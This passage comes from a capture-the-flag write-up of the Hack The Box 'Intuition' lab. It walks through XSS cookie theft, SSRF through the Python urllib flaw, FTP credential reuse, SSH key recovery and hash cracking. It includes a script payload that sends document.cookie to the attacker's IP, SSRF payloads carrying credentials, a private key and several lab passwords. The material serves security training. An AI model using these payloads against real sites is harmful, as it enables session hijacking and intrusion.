<li>Port 22: SSH</li>
<li>Port 80: HTTP</li>
</ul>
<p>Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
</span></span><span class="line"><span class="cl">|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://comprezzor.htb/
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>When I navigated to the web service running on port 80, I was greeted with the initial site. This gave me a first look at the target&rsquo;s web interface and allowed me to begin assessing potential entry points or vulnerabilities in the web application.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled.png"></p>
<p>During my exploration, I discovered several subdomains associated with the target:</p>
<ul>
<li><strong>report.comprezzor.htb</strong></li>
<li><strong>auth.comprezzor.htb</strong></li>
<li><strong>dashboard.comprezzor.htb</strong> (requires login as an authorized user)</li>
</ul>
<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
<p>To gain unauthorized access, I decided to attempt stealing cookies using a cross-site scripting (XSS) vulnerability. I used the bug report form on <strong>report.comprezzor.htb</strong> for this purpose. Here is the payload I used:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://10.10.14.102:80/?cookie=&#34;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>This payload successfully captured the cookie by sending the cookie data to my server at <strong><code>http://10.10.14.102</code></strong>. With this session cookie, I could potentially access restricted areas like <strong>dashboard.comprezzor.htb</strong>, demonstrating a significant security flaw that could be exploited for further penetration testing.</p>
<p>After countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">10.129.54.146 - - [28/Apr/2024 11:51:15] &#34;GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&#34; 404 -
</span></span><span class="line"><span class="cl">10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found
</span></span><span class="line"><span class="cl">10.129.54.146 - - [28/Apr/2024 11:51:15] &#34;GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&#34; 404 -
</span></span></code></pre></div><p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%201.png"></p>
<p>Using the stolen cookie, I accessed the &ldquo;Create PDF Report&rdquo; site. From here, I executed a Server-Side Request Forgery (SSRF) attack by manipulating the report URL to send a request to my own HTTP server. This allowed me to intercept and analyze the server&rsquo;s response.</p>
<p>Through this SSRF attack, I received a new cookie:</p>
<pre tabindex="0"><code>eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
</code></pre><p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%202.png"></p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%203.png"></p>
<p>By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nf">User-Agent</span><span class="o">:</span> <span class="n">Python</span>-<span class="n">urllib</span>/3.11
</span></span></code></pre></div><p>This indicated that the application might be using a Python script to handle requests. Recognizing the potential for exploitation, I researched and found relevant exploits, including one discussed in <a href="https://github.com/python/cpython/issues/102153">this GitHub issue</a>.</p>
<p>Utilizing this CVE, I managed to retrieve the source code of the application via the SSRF attack. Access to the source code provided valuable insights into the internal workings of the application, including potential vulnerabilities and misconfigurations.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%204.png"></p>
<p>Using the SSRF vulnerability, I targeted the specific path where the application code was likely stored. By sending a request to fetch <strong><code>python3/app/code/app.py</code></strong>, I successfully retrieved the source code of the Flask application.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%205.png"></p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%206.png"></p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%207.png"></p>
<p>By analyzing the source code retrieved from <strong><code>python3/app/code/app.py</code></strong>, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">project_folder/
</span></span><span class="line"><span class="cl">‚îÇ
</span></span><span class="line"><span class="cl">‚îú‚îÄ‚îÄ app.py
</span></span><span class="line"><span class="cl">‚îÇ
</span></span><span class="line"><span class="cl">‚îú‚îÄ‚îÄ blueprints/
</span></span><span class="line"><span class="cl">‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ
</span></span><span class="line"><span class="cl">‚îÇ   ‚îú‚îÄ‚îÄ index/
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ index.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ
</span></span><span class="line"><span class="cl">‚îÇ   ‚îú‚îÄ‚îÄ report/
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ report.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ
</span></span><span class="line"><span class="cl">‚îÇ   ‚îú‚îÄ‚îÄ auth/
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ __init__.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ auth.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îÇ
</span></span><span class="line"><span class="cl">‚îÇ   ‚îî‚îÄ‚îÄ dashboard/
</span></span><span class="line"><span class="cl">‚îÇ       ‚îú‚îÄ‚îÄ __init__.py
</span></span><span class="line"><span class="cl">‚îÇ       ‚îî‚îÄ‚îÄ dashboard.py
</span></span><span class="line"><span class="cl">‚îÇ
</span></span><span class="line"><span class="cl">‚îî‚îÄ‚îÄ static/
</span></span><span class="line"><span class="cl">    ‚îú‚îÄ‚îÄ css/
</span></span><span class="line"><span class="cl">    ‚îú‚îÄ‚îÄ js/
</span></span><span class="line"><span class="cl">    ‚îî‚îÄ‚îÄ ...
</span></span></code></pre></div><p>With the useful code extracted from <strong><code>dashboard.py</code></strong> using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">try:
</span></span><span class="line"><span class="cl">    ftp = FTP(&#39;ftp.local&#39;)
</span></span><span class="line"><span class="cl">    ftp.login(user=&#39;ftp_admin&#39;, passwd=&#39;u3jai8y71s2&#39;)
</span></span><span class="line"><span class="cl">    ftp.cwd(&#39;/&#39;)
</span></span><span class="line"><span class="cl">    with open(backup_filename, &#39;rb&#39;) as file:
</span></span><span class="line"><span class="cl">        ftp.storbinary(f&#39;STOR {backup_filename}&#39;, file)
</span></span><span class="line"><span class="cl">    ftp.quit()
</span></span><span class="line"><span class="cl">    os.remove(backup_filename)
</span></span><span class="line"><span class="cl">    flash(&#39;Backup and upload completed successfully!&#39;, &#39;success&#39;)
</span></span><span class="line"><span class="cl">except Exception as e:
</span></span><span class="line"><span class="cl">    flash(f&#39;Error: {str(e)}&#39;, &#39;error&#39;)
</span></span><span class="line"><span class="cl">    return redirect(url_for(&#39;dashboard.dashboard&#39;))
</span></span></code></pre></div><p>In the code above, I noticed FTP credentials. I&rsquo;ll utilize the SSRF method to connect to this FTP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp://ftp_admin:u3jai8y71s2@ftp.local/
</span></span></code></pre></div><p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%208.png"></p>
<p>I used the FTP credentials as an SSRF payload from the previous step. We observed there is a private key. I attempt to view it.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%209.png"></p>
<p>With this payload, I will attempt to view the private key located at the following FTP URL: <strong><code>ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key</code></strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
</span></span><span class="line"><span class="cl">cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
</span></span><span class="line"><span class="cl">KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
</span></span><span class="line"><span class="cl">KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7
</span></span><span class="line"><span class="cl">x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR
</span></span><span class="line"><span class="cl">BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX
</span></span><span class="line"><span class="cl">U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk
</span></span><span class="line"><span class="cl">TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+
</span></span><span class="line"><span class="cl">efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc
</span></span><span class="line"><span class="cl">JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec
</span></span><span class="line"><span class="cl">80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT
</span></span><span class="line"><span class="cl">ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V
</span></span><span class="line"><span class="cl">YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA
</span></span><span class="line"><span class="cl">bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia
</span></span><span class="line"><span class="cl">R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7
</span></span><span class="line"><span class="cl">cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT
</span></span><span class="line"><span class="cl">9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz
</span></span><span class="line"><span class="cl">YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa
</span></span><span class="line"><span class="cl">lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO
</span></span><span class="line"><span class="cl">JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu
</span></span><span class="line"><span class="cl">r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk
</span></span><span class="line"><span class="cl">wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh
</span></span><span class="line"><span class="cl">FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/
</span></span><span class="line"><span class="cl">Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW
</span></span><span class="line"><span class="cl">1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu
</span></span><span class="line"><span class="cl">eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3
</span></span><span class="line"><span class="cl">NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ
</span></span><span class="line"><span class="cl">XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4
</span></span><span class="line"><span class="cl">AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA
</span></span><span class="line"><span class="cl">rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N
</span></span><span class="line"><span class="cl">KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P
</span></span><span class="line"><span class="cl">bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI
</span></span><span class="line"><span class="cl">9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl
</span></span><span class="line"><span class="cl">nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW
</span></span><span class="line"><span class="cl">ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
</span></span><span class="line"><span class="cl">nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
</span></span><span class="line"><span class="cl">XxwXArPr6+HQe9hZSjI2hjYC2OU=
</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>There is also a passphrase &ldquo;<strong><code>Y27SH19HDIWD</code></strong>&rdquo; on the FTP server, which we can retrieve using the following payload:</p>
<p><strong><code>report_url=++++ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt</code></strong></p>
<p>Now I will execute <strong><code>ssh-add</code></strong> to extract the username from the <strong><code>id_rsa</code></strong> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/s5]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ ssh-add id_rsa
</span></span><span class="line"><span class="cl">Enter passphrase for id_rsa: 
</span></span><span class="line"><span class="cl">Identity added: id_rsa (dev_acc@local)
</span></span></code></pre></div><p>It indicates that the user is <strong><code>dev_acc</code></strong>. Now, I will SSH to the user using the command: <strong><code>ssh dev_acc@10.129.54.146 -i id_rsa</code></strong>.</p>
<p><img alt="Untitled" loading="lazy" src="/posts/writeups/hackthebox/intuition/Untitled%2010.png"></p>
<p>We successfully obtained the user flag! üö©</p>
<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
<p>Now, I&rsquo;ll run LinPEAS by fetching it from my host system using a HTTP server created with Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Users with console
</span></span><span class="line"><span class="cl">adam:x:1002:1002:,,,:/home/adam:/bin/bash                                                                                                                                                                         
</span></span><span class="line"><span class="cl">dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
</span></span><span class="line"><span class="cl">lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>After LinPEAS finished running, I made note of the users in case we might need them later.</p>
<p>Additionally, I found a users.db file in the blueprints directory. I will view its contents using <strong><code>cat</code></strong> to see if we can gather any information.</p>
<p>The users.db file contains a hash for the user &ldquo;adam&rdquo;. We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.</p>
<pre tabindex="0"><code>ÔøΩÔøΩÔøΩÔøΩP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)ÔøΩ3ÔøΩEtableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT &#39;user&#39;
,ÔøΩ,##wÔøΩÔøΩhÔøΩ=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevhÔøΩ=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ
</code></pre><p>After cracking the hash for user &ldquo;adam&rdquo; using hashcat with the command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat.exe -m <span class="m">30120</span> myhash.txt rockyou.txt
</span></span></code></pre></div><p>The credentials for user &ldquo;adam&rdquo; are:</p>
<pre tabindex="0"><code>username: adam
password: adam gray
</code></pre><p>I conducted further enumeration and discovered valid credentials for another user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dev_acc@intuition:/$ zgrep -i lopez /var/log/suricata/*.gz
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:43:36.099184+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1988487100549589,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:37522,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:1,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;USER&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;lopez&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;331&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Username ok, send password.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:43:52.999165+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1988487100549589,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:37522,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:2,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;PASS&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;Lopezzz1992%123&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;530&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Authentication failed.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:44:32.133372+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1218304978677234,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:45760,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:1,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;USER&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;lopez&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;331&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Username ok, send password.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:44:48.188361+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1218304978677234,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:45760,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:2,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;PASS&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;Lopezz1992%123&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;230&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Login successful.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span></code></pre></div><p>I obtained the password for user &ldquo;lopez.&rdquo; It is <strong><code>Lopezz1992%123</code></strong>. I used this password to access the account of user &ldquo;lopez.&rdquo;</p>
<p>I also gained access to FTP using:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lopez@intuition:~$ ftp adam@127.0.0.1
</span></span><span class="line"><span class="cl">Connected to 127.0.0.1.
</span></span><span class="line"><span class="cl"><span class="m">220</span> pyftpdlib 1.5.7 ready.
</span></span><span class="line"><span class="cl"><span class="m">331</span> Username ok, send password.
</span></span><span class="line"><span class="cl">Password: adam gray
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span></code></pre></div><p>I retrieved all the cool stuff from there using the <strong><code>get &lt;file_name&gt;</code></strong> command:</p>
<ul>
<li><strong><code>payload.txt</code></strong></li>
<li><strong><code>runner1</code></strong></li>
<li><strong><code>runner1.c</code></strong></li>
<li><strong><code>run-tests.sh</code></strong></li>
</ul>
<p>The &ldquo;run-tests.sh&rdquo; file contains:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># List playbooks</span>
</span></span><span class="line"><span class="cl">./runner1 list
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Run playbooks [Need authentication]</span>
